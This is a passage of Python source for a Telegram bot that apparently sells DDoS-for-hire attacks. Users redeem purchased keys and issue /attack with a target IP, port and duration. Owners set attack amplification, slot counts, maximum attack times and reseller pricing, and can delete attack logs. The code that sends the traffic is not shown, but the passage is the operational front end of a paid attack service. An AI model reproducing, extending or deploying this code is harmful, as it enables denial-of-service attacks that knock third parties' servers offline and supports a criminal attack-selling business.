    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"✅ Balance Removed!\n\n👤 Reseller: {display}\n🆔 ID: {reseller_id}\n➖ Removed: {amount} Rs\n💵 New Balance: {new_balance} Rs", reply_to=message)

@bot.message_handler(commands=["saldo"])
def saldo_check_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /saldo <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)
        return
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"💰 Reseller Balance\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys: {reseller.get('total_keys_generated', 0)}\n📊 Status: {'🚫 Blocked' if reseller.get('blocked') else '✅ Active'}", reply_to=message)

@bot.message_handler(commands=["setprice"])
def set_price_command(message):
    global RESELLER_PRICING
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 1:
        response = "═══════════════════════════\n"
        response += "💵 CURRENT PRICING\n"
        response += "═══════════════════════════\n\n"
        for dur, info in RESELLER_PRICING.items():
            response += f"• {dur}: {info['price']} Rs ({info['label']})\n"
        response += "\n⚠️ Usage: /setprice <duration> <price>\n"
        response += "Example: /setprice 1d 60\n"
        response += "═══════════════════════════"
        safe_send_message(message.chat.id, response, reply_to=message)
        return
    
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /setprice <duration> <price>\n\nDurations: 12h, 1d, 3d, 7d, 30d, 60d\nExample: /setprice 1d 60", reply_to=message)
        return
    
    duration_key = command_parts[1].lower()
    
    if duration_key not in RESELLER_PRICING:
        safe_send_message(message.chat.id, "❌ Invalid duration!\n\nValid: 12h, 1d, 3d, 7d, 30d, 60d", reply_to=message)
        return
    
    try:
        new_price = int(command_parts[2])
        if new_price < 0:
            safe_send_message(message.chat.id, "❌ Price cannot be less than 0!", reply_to=message)
            return
    except:
        safe_send_message(message.chat.id, "❌ Invalid price! Enter a number.", reply_to=message)
        return
    
    old_price = RESELLER_PRICING[duration_key]['price']
    RESELLER_PRICING[duration_key]['price'] = new_price
    
    set_setting(f'price_{duration_key}', new_price)
    update_reseller_pricing()
    
    safe_send_message(message.chat.id, f"✅ Price Updated!\n\n📦 Duration: {RESELLER_PRICING[duration_key]['label']}\n💵 Old Price: {old_price} Rs\n💰 New Price: {new_price} Rs", reply_to=message)

@bot.message_handler(commands=["mysaldo"])
def my_saldo_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    if not reseller:
        safe_send_message(message.chat.id, "❌ You are not a reseller!", reply_to=message)
        return
    
    if reseller.get('blocked'):
        safe_send_message(message.chat.id, "🚫 Your panel is blocked!", reply_to=message)
        return
    
    safe_send_message(message.chat.id, f"💰 Your Balance\n\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys Generated: {reseller.get('total_keys_generated', 0)}\n\n📋 Use /prices to see key prices\n🔑 Use /gen <duration> to generate key", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["prices"])
def prices_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not is_reseller(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command is for resellers only!", reply_to=message)
        return
    
    update_reseller_pricing()
    
    response = "═══════════════════════════\n"
    response += "💵 KEY PRICING\n"
    response += "═══════════════════════════\n\n"
    
    durations = ['12h', '1d', '3d', '7d', '30d', '60d']
    for dur in durations:
        if dur in RESELLER_PRICING:
            info = RESELLER_PRICING[dur]
            response += f"🔴 {info['label']:<9} ➜  {info['price']} Rs\n"
            
    response += "\n═══════════════════════════\n"
    response += "📋 Usage: /gen <duration> <count>\n"
    response += "Example: /gen 1d 1\n"
    response += "═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["attack"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    # Check individual cooldown first
    cooldown = get_user_cooldown(user_id)
    if cooldown > 0:
        safe_send_message(message.chat.id, f"⏳ Your cooldown active! Wait: {cooldown}s\n\nPlease wait before starting another attack.", reply_to=message)
        return
    
    # Check if user has pending feedback
    if has_pending_feedback(user_id):
        safe_send_message(message.chat.id, 
            "📸 **Feedback Required!**\n\n"
            "You must send a screenshot/photo as feedback from your last attack before starting a new one.\n\n"
            "Please send any photo to continue.", 
            reply_to=message, parse_mode="Markdown")
        return
    
    if not has_valid_key(user_id):
        user = users_collection.find_one({'user_id': user_id})
        if user and user.get('reseller_username'):
            reseller_name = user.get('reseller_username')
            safe_send_message(message.chat.id, f"❌ Key expired!\n\n🔄 For renewal DM: @{reseller_name}", reply_to=message)
        else:
            safe_send_message(message.chat.id, "❌ You don't have a valid key!\n\n🔑 Contact a reseller to purchase a key.", reply_to=message)
        return
    
    # Check slot availability (multiple concurrent attacks allowed)
    busy_slots, free_slots, total_slots = get_slot_status()
    if free_slots <= 0:
        safe_send_message(message.chat.id, f"❌ All {total_slots} slots are busy!\n\nPlease wait for an attack to finish.\n\n📊 Free: 0/{total_slots}", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_send_message(message.chat.id, "⚠️ Usage: /attack <ip> <port> <time>\n\nMinimum time: 60 seconds", reply_to=message)
        return
    
    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    
    if not validate_target(target):
        safe_send_message(message.chat.id, "❌ Invalid IP!", reply_to=message)
        return
    
    if is_ip_blocked(target):
        safe_send_message(message.chat.id, "🚫 This IP is blocked! Use another IP.", reply_to=message)
        return
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            safe_send_message(message.chat.id, "❌ Invalid port! (1-65535)", reply_to=message)
            return
        duration = int(duration)
        
        if duration < MIN_ATTACK_TIME and not is_owner(user_id):
            safe_send_message(message.chat.id, f"❌ Minimum attack time is {MIN_ATTACK_TIME} seconds!", reply_to=message)
            return
        
        max_time = get_max_attack_time()
        if not is_owner(user_id) and duration > max_time:
            safe_send_message(message.chat.id, f"❌ Max time: {max_time}s", reply_to=message)
            return
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        api_index = get_free_api_index()
        
        if api_index is None:
            safe_send_message(message.chat.id, "❌ No free slots available! Please wait.", reply_to=message)
            return
        
        with _attack_lock:
            if user_id not in user_attack_history:
                user_attack_history[user_id] = {}
            user_attack_history[user_id][f"{target}:{port}"] = datetime.now()

            api_in_use[attack_id] = api_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration)
            }
        
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index))
        thread.start()
        
    except ValueError:
        safe_send_message(message.chat.id, "❌ Port and time must be numbers!", reply_to=message)

@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not has_valid_key(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Purchase a key first!", reply_to=message)
        return
        
    response = build_status_message(user_id)
    try:
        sent_msg = safe_send_message(message.chat.id, response, reply_to=message)
        
        if user_has_active_attack(user_id) or get_user_cooldown(user_id) > 0:
            thread = threading.Thread(target=update_status_loop, args=(sent_msg.chat.id, sent_msg.message_id, user_id))
            thread.daemon = True
            thread.start()
    except Exception as e:
        print(f"Status command error: {e}")
        safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key'):
        safe_send_message(message.chat.id, "❌ You don't have a key!", reply_to=message)
        return
    
    if not has_valid_key(user_id):
        reseller_username = user.get('reseller_username')
        if reseller_username:
            safe_send_message(message.chat.id, f"❌ Key expired!\n\n🔄 For renewal DM: @{reseller_username}", reply_to=message, parse_mode="Markdown")
        else:
            safe_send_message(message.chat.id, "❌ Key expired!", reply_to=message)
        return
    
    remaining = get_time_remaining(user_id)
    safe_send_message(message.chat.id, f"🔑 Key Details\n\n📌 Key: `{user['key']}`\n⏳ Remaining: {remaining}\n✅ Status: Active", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /redeem <key>", reply_to=message)
        return
    
    key_input = command_parts[1]
    key_doc = keys_collection.find_one({'key': key_input})
    
    if not key_doc:
        safe_send_message(message.chat.id, "❌ Invalid key!", reply_to=message)
        return
    
    max_users = key_doc.get('max_users', 1)
    current_users = key_doc.get('current_users', 0)
    
    if key_doc['used'] and current_users >= max_users:
        safe_send_message(message.chat.id, "❌ This key has already been used!", reply_to=message)
        return
    
    user = users_collection.find_one({'user_id': user_id})
    reseller_username = key_doc.get('created_by_username') if key_doc.get('created_by_type') == 'reseller' else None
    
    if user and user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + timedelta(seconds=key_doc['duration_seconds'])
        
        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {
                'key': key_input,
                'key_expiry': new_expiry,
                'key_duration_seconds': key_doc['duration_seconds'],
                'key_duration_label': key_doc['duration_label'],
                'redeemed_at': datetime.now(),
                'reseller_username': reseller_username
            }}
        )
        
        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}}
            )
        else:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}}
            )
        
        new_remaining = get_time_remaining(user_id)
        safe_send_message(message.chat.id, f"✅ Key Extended!\n\n🔑 Key: `{key_input}`\n⏰ Added: {key_doc['duration_label']}\n⏳ Total Time: {new_remaining}", reply_to=message, parse_mode="Markdown")
    else:
        expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
        
        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {
                'user_id': user_id,
                'username': user_name,
                'key': key_input,
                'key_expiry': expiry_time,
                'key_duration_seconds': key_doc['duration_seconds'],
                'key_duration_label': key_doc['duration_label'],
                'redeemed_at': datetime.now(),
                'reseller_username': reseller_username
            }},
            upsert=True
        )
        
        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}}
            )
        else:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}}
            )
        
        remaining = get_time_remaining(user_id)
        safe_send_message(message.chat.id, f"✅ Key Redeemed!\n\n🔑 Key: `{key_input}`\n⏰ Duration: {key_doc['duration_label']}\n⏳ Time Left: {remaining}", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["max_concurrent"])
def max_concurrent_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        busy_slots, free_slots, total_slots = get_slot_status()
        safe_send_message(message.chat.id, 
            f"⚙️ **Slot Management**\n\n"
            f"📊 Current Max Slots: **{current_max_slots}**\n"
            f"🟢 Free Slots: {free_slots}/{current_max_slots}\n"
            f"🔴 Used Slots: {busy_slots}/{current_max_slots}\n\n"
            f"📝 Usage: `/max_concurrent <number>`\n"
            f"🔹 Range: 1-{MAX_SLOTS_LIMIT}\n"
            f"🔹 This controls how many users can attack simultaneously", 
            reply_to=message, parse_mode="Markdown")
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < 1 or new_value > MAX_SLOTS_LIMIT:
            safe_send_message(message.chat.id, f"❌ Value must be between 1 and {MAX_SLOTS_LIMIT}!", reply_to=message)
            return
        
        old_value = current_max_slots
        if update_max_slots(new_value):
            global API_LIST
            API_LIST = get_api_list()
            safe_send_message(message.chat.id, 
                f"✅ **Max Concurrent Slots Updated!**\n\n"
                f"📊 Old: {old_value} slots\n"
                f"📊 New: {new_value} slots\n\n"
                f"🔄 Now {new_value} users can attack simultaneously!\n"
                f"💡 Use `/status` to see slot availability", 
                reply_to=message, parse_mode="Markdown")
        else:
            safe_send_message(message.chat.id, "❌ Failed to update slots!", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["concurrent"])
def concurrent_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_concurrent_limit()
        safe_send_message(message.chat.id, 
            f"⚙️ **Attack Amplification**\n\n"
            f"💪 Current: **{current}x** per attack\n\n"
            f"📝 Usage: `/concurrent <number>`\n"
            f"🔹 This sends multiple requests per attack\n"
            f"🔹 Example: `/concurrent 3` = 3x stronger attack\n\n"
            f"⚠️ Note: This is different from max concurrent slots!\n"
            f"   • `/max_concurrent` = users at once\n"
            f"   • `/concurrent` = strength per attack", 
            reply_to=message, parse_mode="Markdown")
        return
        
    try:
        new_value = int(command_parts[1])
        if new_value < 1 or new_value > 20:
            safe_send_message(message.chat.id, "❌ Value must be between 1-20!", reply_to=message)
            return
        
        set_setting('_cx_th', new_value)
        safe_send_message(message.chat.id, f"✅ Attack amplification set to: **{new_value}x**\n\nNow each attack will send {new_value} requests!", reply_to=message, parse_mode="Markdown")
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["max_attack"])
def max_attack_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_max_attack_time()
        safe_send_message(message.chat.id, f"⚙️ Current Max Attack Time: {current}s\n\nChange: /max_attack <seconds>", reply_to=message)
        return
    try:
        new_value = int(command_parts[1])
        if new_value < MIN_ATTACK_TIME:
            safe_send_message(message.chat.id, f"❌ Value must be at least {MIN_ATTACK_TIME} seconds!", reply_to=message)
            return
        set_setting('max_attack_time', new_value)
        safe_send_message(message.chat.id, f"✅ Max Attack Time set: {new_value}s", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["cooldown"])
def cooldown_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_user_cooldown_setting()
        safe_send_message(message.chat.id, f"⏳ Current Cooldown: {current}s\n\nChange: /cooldown <seconds>", reply_to=message)
        return
    try:
        new_value = int(command_parts[1])
        if new_value < 0:
            safe_send_message(message.chat.id, "❌ Cooldown cannot be negative!", reply_to=message)
            return
        set_setting('user_cooldown', new_value)
        safe_send_message(message.chat.id, f"✅ Cooldown set: {new_value}s", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["block_ip"])
def block_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /block_ip <ip_prefix>\n\nExample: /block_ip 192.168.\nExample: /block_ip 10.0.", reply_to=message)
        return
    
    ip_prefix = command_parts[1]
    if add_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"✅ IP Blocked!\n\n🚫 Prefix: `{ip_prefix}`\n\nNow IPs starting with {ip_prefix}* cannot be attacked.", reply_to=message, parse_mode="Markdown")
    else:
        safe_send_message(message.chat.id, f"ℹ️ `{ip_prefix}` is already blocked!", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["unblock_ip"])
def unblock_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unblock_ip <ip_prefix>", reply_to=message)
        return
    
    ip_prefix = command_parts[1]
    if remove_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"✅ IP Unblocked!\n\n✅ Prefix: `{ip_prefix}`", reply_to=message, parse_mode="Markdown")
    else:
        safe_send_message(message.chat.id, f"❌ `{ip_prefix}` is not in the blocked list!", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["blocked_ips"])
def blocked_ips_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    blocked = get_blocked_ips()
    if not blocked:
        safe_send_message(message.chat.id, "📋 No IPs are blocked!", reply_to=message)
        return
    
    response = "🚫 BLOCKED IPs\n\n"
    for i, ip in enumerate(blocked, 1):
        response += f"{i}. `{ip}`*\n"
    response += f"\n📊 Total: {len(blocked)}"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["prot_on"])
def prot_on_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    set_setting('port_protection', True)
    safe_send_message(message.chat.id, "✅ Port Spam Protection enabled!", reply_to=message)

@bot.message_handler(commands=["prot_off"])
def prot_off_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    set_setting('port_protection', False)
    safe_send_message(message.chat.id, "✅ Port Spam Protection disabled!", reply_to=message)

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /maintenance <message>\n\nExample: /maintenance Bot is updating, please wait 10 minutes", reply_to=message)
        return
    
    msg = command_parts[1]
    set_maintenance(True, msg)
    safe_send_message(message.chat.id, f"🔧 Maintenance Mode ON!\n\nMessage: {msg}\n\nUse /ok to turn off", reply_to=message)

@bot.message_handler(commands=["ok"])
def ok_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    if not is_maintenance():
        safe_send_message(message.chat.id, "ℹ️ Maintenance mode is already OFF!", reply_to=message)
        return
    
    set_maintenance(False)
    safe_send_message(message.chat.id, "✅ Maintenance Mode OFF!\n\nBot is now normal.", reply_to=message)

@bot.message_handler(commands=["live"])
def live_stats_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    uptime = datetime.now() - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    
    process = psutil.Process()
    memory_mb = process.memory_info().rss / 1024 / 1024
    cpu_percent = process.cpu_percent(interval=0.1)
    
    ram = psutil.virtual_memory()
    ram_percent = ram.percent
    
    total_users = users_collection.count_documents({})
    active_users = users_collection.count_documents({'key_expiry': {'$gt': datetime.now()}})
    
    total_resellers = resellers_collection.count_documents({})
    total_keys = keys_collection.count_documents({})
    active_keys = keys_collection.count_documents({'used': False})
    
    busy_slots, free_slots, total_slots = get_slot_status()
    
    response = f"""
📊 **SERVER STATISTICS**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🤖 **BOT INFO:**
• Uptime: {hours:02d}:{minutes:02d}:{seconds:02d}
• Memory: {memory_mb:.1f} MB
• CPU: {cpu_percent:.1f}%
• RAM: {ram_percent:.1f}%

⚔️ **ATTACK STATUS:**
• Active Attacks: {busy_slots}/{total_slots}
• Free Slots: {free_slots}
• Max Slots: {total_slots}
• Attack Amplification: {get_concurrent_limit()}x

⚙️ **SETTINGS:**
• Max Attack Time: {get_max_attack_time()}s
• Min Attack Time: {MIN_ATTACK_TIME}s
• Individual Cooldown: {get_user_cooldown_setting()}s

📈 **BOT DATA:**
• Total Users: {total_users}
• Active Users: {active_users}
• Resellers: {total_resellers}
• Total Keys: {total_keys}
• Available Keys: {active_keys}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["logs"])
def attack_logs_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    all_logs = list(attack_logs_collection.find().sort('timestamp', -1))
    
    if not all_logs:
        safe_send_message(message.chat.id, "📋 No attack logs found!", reply_to=message)
        return
    
    content = "📊 **ATTACK LOGS**\n\n"
    for i, log in enumerate(all_logs[:50], 1):
        content += f"{i}. **{log.get('username')}** → `{log.get('target')}:{log.get('port')}`\n"
        content += f"   ⏱️ {log.get('duration')}s | 🕐 {log.get('timestamp').strftime('%d-%m-%Y %H:%M')}\n\n"
    
    send_long_message(message, content, parse_mode="Markdown")

@bot.message_handler(commands=["del_logs"])
def delete_logs_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    count = attack_logs_collection.count_documents({})
    if count == 0:
        safe_send_message(message.chat.id, "📋 No logs to delete!", reply_to=message)
        return
    
    attack_logs_collection.delete_many({})
    safe_send_message(message.chat.id, f"✅ {count} attack logs deleted!", reply_to=message)

@bot.message_handler(commands=["user_resell"])
def user_resell_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /user_resell <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    keys = list(keys_collection.find({'created_by': reseller_id, 'used': True}))
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if not keys:
        safe_send_message(message.chat.id, f"📋 Reseller {display} has no users!", reply_to=message)
        return
    
    response = f"═══════════════════════════\n"
    response += f"👤 RESELLER {display} USERS\n"
    response += "═══════════════════════════\n\n"
    
    for i, key in enumerate(keys[:15], 1):
        user = users_collection.find_one({'key': key['key']})
        if user:
            response += f"{i}. 👤 {user.get('username', 'Unknown')}\n"
            response += f"   📱 ID: {user['user_id']}\n"
            response += f"   🔑 Key: {key['key']}\n\n"
    
    response += f"═══════════════════════════\n"
    response += f"📊 Total Users: {len(keys)}\n"
    response += "═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["broadcast"])
def broadcast_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /broadcast <message>", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    all_users = list(users_collection.find())
    all_resellers = list(resellers_collection.find())
    all_bot_users = list(bot_users_collection.find())
    
    all_user_ids = set()
    for u in all_users:
        all_user_ids.add(u['user_id'])
    for r in all_resellers:
        all_user_ids.add(r['user_id'])
    for bu in all_bot_users:
        all_user_ids.add(bu['user_id'])
    
    sent_count = 0
    failed_count = 0
    
    progress_msg = safe_send_message(message.chat.id, f"📢 Broadcasting to {len(all_user_ids)} users...", reply_to=message)
    
    for uid in all_user_ids:
        try:
            if uid == BOT_OWNER:
                continue
            bot.send_message(uid, f"📢 **BROADCAST**\n\n{broadcast_msg}", parse_mode="Markdown")
            sent_count += 1
            time.sleep(0.05)
        except:
            failed_count += 1
    
    try:
        bot.edit_message_text(
            f"✅ Broadcast Complete!\n\n👤 Sent: {sent_count}\n❌ Failed: {failed_count}",
            message.chat.id,
            progress_msg.message_id
        )
    except:
        safe_send_message(message.chat.id, f"✅ Broadcast Complete!\n\n👤 Sent: {sent_count}\n❌ Failed: {failed_count}", reply_to=message)

@bot.message_handler(commands=["broadcast_reseller"])
def broadcast_reseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /broadcast_reseller <message>", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    resellers = list(resellers_collection.find())
    reseller_ids = [r['user_id'] for r in resellers]
    
    sent_count = 0
    failed_count = 0
    
    for rid in reseller_ids:
        try:
            bot.send_message(rid, f"📢 **RESELLER NOTICE**\n\n{broadcast_msg}", parse_mode="Markdown")
            sent_count += 1
            time.sleep(0.05)
        except:
            failed_count += 1
    
    safe_send_message(message.chat.id, f"✅ Reseller Broadcast Complete!\n\n👤 Sent: {sent_count}\n❌ Failed: {failed_count}", reply_to=message)

@bot.message_handler(commands=["broadcast_paid"])
def broadcast_paid_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /broadcast_paid <message>", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    now = datetime.now()
    active_subscribers = list(users_collection.find({'key_expiry': {'$gt': now}}))
    
    sent_count = 0
    failed_count = 0
    
    for user in active_subscribers:
        try:
            uid = user['user_id']
            if uid == BOT_OWNER:
                continue
            bot.send_message(uid, f"💎 **PAID USER ANNOUNCEMENT**\n\n{broadcast_msg}", parse_mode="Markdown")
            sent_count += 1
            time.sleep(0.05)
        except:
            failed_count += 1
    
    safe_send_message(message.chat.id, f"✅ Paid Broadcast Complete!\n\n👤 Sent: {sent_count}\n❌ Failed: {failed_count}", reply_to=message)

@bot.message_handler(commands=["trail"])
def owner_trail_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /trail <duration> <count>\n\nExample: /trail 1h 10", reply_to=message)
        return
    
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, "❌ Invalid duration!", reply_to=message)
        return
    
    try:
        count = int(command_parts[2])
        if count < 1 or count > 20:
            safe_send_message(message.chat.id, "❌ Count must be between 1-20!", reply_to=message)
            return
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid count!", reply_to=message)
        return
    
    generated_keys = []
    for _ in range(count):
        key = f"TRAIL-OWNER-{generate_key(10)}"
        key_doc = {
            'key': key,
            'duration_seconds': int(duration.total_seconds()),
            'duration_label': f"{duration_label} (Owner Trail)",
            'created_at': datetime.now(),
            'created_by': user_id,
            'created_by_type': 'owner_trail',
            'used': False,
            'used_by': None,
            'used_at': None,
            'max_users': 1,
            'is_trail': True
        }
        keys_collection.insert_one(key_doc)
        generated_keys.append(key)
    
    keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
    safe_send_message(message.chat.id, f"✅ {count} Owner Trail Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["reseller_trail", "resellertrail"])
def reseller_trail_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /reseller_trail <hours> <max_users>\n\nExample: /reseller_trail 1 10 (1hr key for resellers)", reply_to=message)
        return
    
    try:
        hours = int(command_parts[1])
        max_users = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid hours or max_users!", reply_to=message)
        return
    
    resellers = list(resellers_collection.find({'blocked': {'$ne': True}}))
    
    if not resellers:
        safe_send_message(message.chat.id, "❌ No active resellers found!", reply_to=message)
        return
    
    sent_count = 0
    for reseller in resellers:
        reseller_id = reseller['user_id']
        try:
            chat = bot.get_chat(reseller_id)
            reseller_username = chat.username or str(reseller_id)
        except:
            reseller_username = str(reseller_id)
        key = f"TRAIL-{reseller_username}-{generate_key(8)}"
        
        key_doc = {
            'key': key,
            'duration_seconds': hours * 3600,
            'duration_label': f"{hours} hours (Reseller Trail)",
            'created_at': datetime.now(),
